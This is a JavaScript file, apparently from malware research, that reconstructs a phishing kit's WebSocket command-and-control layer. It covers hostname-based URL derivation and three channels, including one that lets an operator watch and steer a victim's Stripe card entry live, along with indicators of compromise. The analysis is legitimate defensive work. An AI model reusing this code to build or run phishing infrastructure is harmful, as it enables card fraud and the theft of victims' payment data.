/**
 * channels.js
 * -----------------------------------------------------------------------------
 * Technical reconstruction for security research — source documentation, READ-ONLY, NOT EXECUTABLE.
 *
 * Source chunks:
 *   - kit-source/decompressed/891034530c94...txt  (getApiBaseUrl / getWsBaseUrl /
 *                                                getDomainFromUrl, module 436329)
 *   - kit-source/decompressed/a3b309f4fb71...txt  (helpdesk channel init)
 *   - kit-source/decompressed/5addca557de7...txt  (stripe/sync channel init)
 *   - kit-source/decompressed/170e4bae9438...txt  (/api/ws/sync facade)
 *
 * SUBSYSTEM: Realtime transport -- channel/URL derivation.
 *
 * The kit talks to its C2 over THREE WebSocket channels, all derived from the
 * SAME base host. The base host is computed from window.location.hostname at
 * runtime (so a deployed phishing page automatically points its sockets back at
 * its own origin over wss://). Env overrides + a localhost dev fallback exist.
 * -----------------------------------------------------------------------------
 */

/* ===========================================================================
 * 1. BASE-URL DERIVATION  (verbatim logic from chunk 891034530c94, module 436329)
 * ===========================================================================
 *
 * Minified original (decoded):
 *   D = () => window ? window.location.hostname : "";
 *   T = a => a.includes("localhost") || a.includes("127.0.0.1")
 *                                     || a.includes("0.0.0.0");
 *   getApiBaseUrl = () => { let a=D();
 *       return (!a||T(a))
 *         ? (m.default.env.API_BASE_URL ?? "http://localhost:5002"
 *             ? m.default.env.API_BASE_URL ?? "http://localhost:5002"
 *             : "http://localhost:5002")
 *         : `https://${a}`; };
 *   getWsBaseUrl  = () => { let a=D();
 *       return (!a||T(a))
 *         ? (m.default.env.WS_BASE_URL ?? "ws://localhost:5002"
 *             ? m.default.env.WS_BASE_URL ?? "ws://localhost:5002"
 *             : "ws://localhost:5002")
 *         : `wss://${a}`; };
 *
 * (The doubled `?? ... ? ?? ... : ...` is a dead/redundant ternary left by the
 *  minifier; it always resolves to `env.X ?? <localhost fallback>`.)
 */

// process.env in the original (m.default.env). Names preserved exactly.
//   WS_BASE_URL  -> websocket base override
//   API_BASE_URL -> http API base override
const ENV = (typeof process !== "undefined" && process.env) || {};

/** Current page hostname, or "" when there is no window (SSR). */
function getHostname() {
  return typeof window !== "undefined" ? window.location.hostname : "";
}

/** True if the host is a local/dev address. */
function isLocalhost(host) {
  return (
    host.includes("localhost") ||
    host.includes("127.0.0.1") ||
    host.includes("0.0.0.0")
  );
}

/**
 * getApiBaseUrl()
 * - Real deployment (has a non-local hostname): `https://<hostname>`
 * - Local/dev or no hostname: env.API_BASE_URL, else "http://localhost:5002"
 * IOC: dev fallback host:port = localhost:5002
 */
function getApiBaseUrl() {
  const host = getHostname();
  if (!host || isLocalhost(host)) {
    return ENV.API_BASE_URL ?? "http://localhost:5002";
  }
  return `https://${host}`;
}

/**
 * getWsBaseUrl()
 * - Real deployment: `wss://<hostname>`  (sockets point back at the phishing
 *   page's own origin)
 * - Local/dev or no hostname: env.WS_BASE_URL, else "ws://localhost:5002"
 * IOC: dev fallback = ws://localhost:5002
 */
function getWsBaseUrl() {
  const host = getHostname();
  if (!host || isLocalhost(host)) {
    return ENV.WS_BASE_URL ?? "ws://localhost:5002";
  }
  return `wss://${host}`;
}

/* ===========================================================================
 * 2. THE THREE CHANNELS
 * ===========================================================================
 * All three are opened by the ReconnectingWebSocketProvider (WebSocketProvider.js)
 * via its singleton facade's init(). Endpoint strings are preserved VERBATIM.
 */

const CHANNELS = {
  /**
   * (A) HELPDESK chat channel.
   *   URL:    `${getWsBaseUrl()}/ws/helpdesk`
   *   PARAMS: { ad_id }                 (ad_id = the phishing "ad" / campaign id)
   *   USED BY: helpdeskChat.js (victim<->operator live chat + victim activity
   *            telemetry frames).
   *   Init (chunk a3b309f4):
   *     sync.init({ provider:"websocket",
   *                 url:`${getWsBaseUrl()}/ws/helpdesk`,
   *                 params:{ ad_id: ad.id.toString() } });
   *   Facade backoff override here: [1000, 5000, 30000].
   */
  helpdesk: {
    path: "/ws/helpdesk",
    url: () => `${getWsBaseUrl()}/ws/helpdesk`,
    params: (adId) => ({ ad_id: String(adId) }),
  },

  /**
   * (B) STRIPE payment-sync channel.
   *   URL:    `${getWsBaseUrl()}/api/ws/stripe/sync`
   *   PARAMS: { ad_id, service_method } (service_method = chosen payment method)
   *   USED BY: the live Stripe checkout mirror -- lets the operator watch/steer
   *            the victim's card-entry flow in real time.
   *   Init (chunk 5addca):
   *     sync.init({ provider:"websocket",
   *                 url:`${getWsBaseUrl()}/api/ws/stripe/sync`,
   *                 params:{ ad_id: ad.id.toString(), service_method: t } });
   *   Provider variant: the pause()/resume() one (no disconnectData).
   */
  stripeSync: {
    path: "/api/ws/stripe/sync",
    url: () => `${getWsBaseUrl()}/api/ws/stripe/sync`,
    params: (adId, serviceMethod) => ({
      ad_id: String(adId),
      service_method: serviceMethod,
    }),
  },

  /**
   * (C) GENERIC SYNC channel.
   *   URL:    `${getWsBaseUrl()}/api/ws/sync`
   *   PARAMS: passed through from caller (params?.) -- ad-event funnel telemetry
   *           ({type:"ad:event", ...}) flows over this channel's facade.
   *   Init (chunk 170e4bae):
   *     n.init({ url: opts?.url ?? `${getWsBaseUrl()}/api/ws/sync`,
   *              protocols: opts?.protocols,
   *              backoffMs: opts?.backoffMs ?? [1000, 5000, 30000],
   *              params: opts?.params });
   */
  sync: {
    path: "/api/ws/sync",
    url: () => `${getWsBaseUrl()}/api/ws/sync`,
    defaultBackoffMs: [1000, 5000, 30000], // [1e3,5e3,3e4]
  },
};

/* ===========================================================================
 * 3. SINGLETON FACADE  (the `_` / `$.sync` object in the bundle)
 * ===========================================================================
 * Each channel module wraps ONE provider instance behind a module-level
 * singleton (`y`/`n` in the minified code) plus a pending-status-listener
 * buffer (`v`) for listeners registered before init().
 *
 * Common surface across all three facades:
 *   init(opts)        - lazily new the provider, wire onMessage -> EventBus,
 *                       replay buffered status listeners, then provider.init(...)
 *   getProvider()
 *   onStatus/offStatus
 *   on(type, handler) / off(type, handler)   - EventBus subscription
 *   send(message, persistent=false)
 *   sendOnce(message)  - helpdesk only; send(message, false)
 *   getStatus()        - "idle" if not yet initialised
 *   close()            - close provider and null the singleton
 *
 * stripe/sync + /api/ws/sync facades ADDITIONALLY expose:
 *   pauseProvider(), resumeProvider(), isProviderPaused(), clearProviderQueue()
 *
 * RECONSTRUCTED-APPROX -- shown as a shape, not a runnable re-impl:
 */
function createChannelFacade(channelKey) {
  let provider = null;
  let pendingStatusListeners = [];
  const eventBus = /* see helpdeskChat.js EventBus */ null;

  return {
    init(opts) {
      provider = new /* ReconnectingWebSocketProvider */ Object();
      // provider.onMessage(frame => eventBus.dispatch(frame));
      for (const l of pendingStatusListeners) provider.onStatus(l);
      pendingStatusListeners = [];
      provider.init({
        url: opts?.url ?? CHANNELS[channelKey].url(),
        protocols: opts?.protocols,
        backoffMs: opts?.backoffMs ?? CHANNELS.sync.defaultBackoffMs,
        params: opts?.params,
      });
    },
    onStatus(l) {
      provider ? provider.onStatus(l) : pendingStatusListeners.push(l);
    },
    on(type, handler) {
      /* eventBus.on(type, handler) */
    },
    send(message, persistent = false) {
      if (!provider) throw new Error("sync not initialized");
      provider.send(message, persistent);
    },
    getStatus() {
      return provider ? provider.getStatus() : "idle";
    },
    close() {
      if (provider) {
        provider.close();
        provider = null;
      }
    },
  };
}

export {
  getHostname,
  isLocalhost,
  getApiBaseUrl,
  getWsBaseUrl,
  CHANNELS,
  createChannelFacade,
};
